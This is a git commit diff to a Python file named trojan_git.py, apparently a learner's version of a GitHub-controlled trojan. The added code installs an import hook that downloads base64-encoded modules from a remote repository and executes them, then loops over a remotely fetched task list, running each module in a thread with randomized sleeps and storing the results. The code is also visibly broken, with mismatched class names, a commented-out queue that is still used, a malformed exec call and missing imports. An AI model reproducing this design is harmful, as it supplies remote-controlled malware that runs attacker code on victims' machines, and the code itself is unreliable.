341ff5fc29048079e7edcb293d9475e496841ecb
HelixY2J <dreamfyre07@gmail.com>
2023-08-28 23:29:17 +0530

    beatified code

--- trojan_git.py
+++ trojan_git.py
@@ -4,12 +4,12 @@ import sys
 import time
 import random
 import threading
-import  Queue
+from queue import *
 import os
 
 import github3 
 
-trojan_id = abc
+trojan_id = 'qwerty'
 
 trojan_config = "%s.json" % trojan_id
 
@@ -19,7 +19,63 @@ trojan_modules = []
 
 configured = False
 
-task_queue = Queue.Queue()
+# task_queue = Queue.queue()
+
+class gitImport(object):
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self,fullname,path=None):
+        if configured:
+            print("Attempting to retrieve %s" % fullname)
+            new_lib = get_file_contents("modules/%s" % fullname)
+
+            if new_lib is not None:
+                self.current_module_code = base64.b64decode(new_lib)
+                return self
+
+        return None
+
+    def load_mod(self,name):
+        module = imp.new_module(name)
+        exec(self.current_module_code in module._dict_)
+        sys.modules[name] = module
+
+        return module
+
+
+    
+def module_runner(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+
+    store_module_result(result)
+    return
+
+sys.meta_path = [Gitimporter()]
+
+while True:
+    if task_queue.empty():
+
+        config = get_trojan_config()
+
+        for task in config:
+            t = threading.Thread(target=module_runner,args=(task['module']))
+            t.start()
+            time.sleep(random.randint(1,10))
+
+        time.sleep(random.randint(1000,10000))
+
+
+
+
+
+
+
+
+
+
 
 def conn_git():
     gh = login(username = "yourusername", password = "yourpassword")
